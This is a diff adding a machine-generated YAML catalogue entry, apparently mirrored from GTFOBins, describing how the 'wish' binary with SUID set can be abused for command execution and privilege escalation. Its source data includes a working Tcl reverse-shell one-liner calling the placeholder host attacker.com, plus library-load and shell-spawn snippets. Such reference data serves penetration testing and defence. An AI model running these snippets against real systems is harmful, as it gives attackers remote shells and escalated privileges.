@@ -1,0 +1,109 @@
+id: gtfobins/wish/inherit/suid
+type: binary
+platform: linux
+name: wish
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: wish
+references:
+- https://gtfobins.github.io/gtfobins/wish/
+- https://gtfobins.github.io/gtfobins/tclsh/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        wish:
+          functions:
+            inherit:
+            - code: wish
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              from: tclsh
+        tclsh:
+          functions:
+            library-load:
+            - code: 'tclsh
+
+                load /path/to/lib.so x'
+              contexts:
+                capabilities: null
+                sudo: null
+                suid: null
+                unprivileged: null
+            reverse-shell:
+            - code: 'tclsh
+
+                set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set
+                e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              listener: tcp-server
+            shell:
+            - code: tclsh
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/wish/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  phases:
+  - value: execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  - value: privilege-escalation
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:d588faae065af15ffbef2e621298b28bceac51a620dae1559ebdd471ff11a927
